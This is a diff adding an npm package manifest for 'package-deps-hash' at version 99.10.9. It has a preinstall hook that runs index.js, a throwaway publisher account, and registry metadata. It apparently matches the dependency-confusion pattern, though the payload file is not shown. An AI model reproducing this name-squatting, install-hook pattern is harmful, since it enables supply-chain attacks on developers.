@@ -1,0 +1,39 @@
+{
+    "name": "package-deps-hash",
+    "version": "99.10.9",
+    "description": "azbit package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "package-deps-hash@99.10.9",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-W+Fz0DqPa9Be58g5WtcXcxmYSzewDE4l6KRpjg3zELRUfzaPZYjz+GZmnVC9OGOTAVn1uo5VCQOnXJEz589ToQ==",
+        "shasum": "195617160399f8e3974e402344aa9a1cd5b06029",
+        "tarball": "https://registry.npmjs.org/package-deps-hash/-/package-deps-hash-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5069,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiPMjSACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmrGphAAoMzSf4skENZdpjgao4l5JFgs2AKvU4kAbjQr2SB/oC1/NZuw\r\nhpGPbkRLTR0u2u8xdI1o0bZi6KyHyXctE9w++6jnHAmgWU3gJAljf9xn8AXG\r\nIorbXvaoItHdwChmpnK5+lL1JaNSt823/owyR+b23jUvcRyOOlbP0yshgONH\r\nFxNcqSMCDwJde5kTxcRskxVpq6wcCmPHBxtWRmzjbLqQjKzii90YmbxcKq5Y\r\n52z+nV+ErPsfOPJQFuucSsnmvQM2zu54lpoQfHebTowlDg3zHXdAplOluLPE\r\ne4BQdN3/Lw21CIaFHKuSOHaDJqECRghrc32loZ59Rq/uFQZaiXfOzvWVyn1P\r\nFh+0n7iW56GvvKNunBjIBa1TBRL5dl4LssufrMcOYC/R7QPS2eK1MECqyrVu\r\nGBApZ7rTeIyT/ncll5enXMzpCq95DE1p4JQLbWzcH/h7XptfMXMK1VaTCLL7\r\n5sGRY3zw4kDyWPa/0B5iSwY9zBh6mQnMpKypKy1uEXub/QW/BFdBhYbQRYlz\r\n4BKJtPhkzjhAjJUKuWLOdb/I23tp+uJB5QM+PRDt2HZwcTqZ4X/absUUTp+Y\r\n78IMN+VkPwJ77MHvRVKslusRMqa5iGgZiGQO+xm2BJSs020Kwbah1dUZpQIF\r\nINkxS2GiEEcz1Pj2SGQQIsuz/LmSlr9HMLs=\r\n=I84q\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "2fkg4nny",
+        "email": "2fkg4nny@rt11.ml"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "2fkg4nny",
+            "email": "2fkg4nny@rt11.ml"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/package-deps-hash_99.10.9_1648150737955_0.3153493550194"
+    },
+    "_hasShrinkwrap": false
+}
